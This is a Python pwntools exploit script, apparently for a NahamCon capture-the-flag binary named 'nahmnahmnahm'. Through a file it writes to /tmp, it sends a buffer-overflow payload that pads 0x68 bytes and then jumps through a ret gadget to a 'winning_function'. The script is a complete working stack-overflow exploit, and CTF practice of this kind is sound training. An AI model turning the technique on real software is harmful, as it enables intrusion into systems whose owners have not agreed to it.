from pwn import *

CONN = "nc challenge.nahamcon.com 32546".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
continue
""".format(
    **locals()
)

# Binary filename
exe = "./nahmnahmnahm"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ld = ELF("/lib64/ld-linux-x86-64.so.2")

if args.REMOTE:
    libc = ELF("./libc-2.27.so")

# Start program
io = start()
offset = 0

# Create empty file

f = open("/tmp/payload", "wb")
f.write(b"\x00")
f.close()

io.sendlineafter(b": ", b"/tmp/payload")

payload = flat(
  b"\x00" * 0x68,
  elf.search(asm("ret")).__next__(),
  elf.sym["winning_function"],
)

f = open("/tmp/payload", "wb")
f.write(payload)
f.close()

sleep(1)
io.sendlineafter(b":", b"A")

# Got Shell?
io.interactive()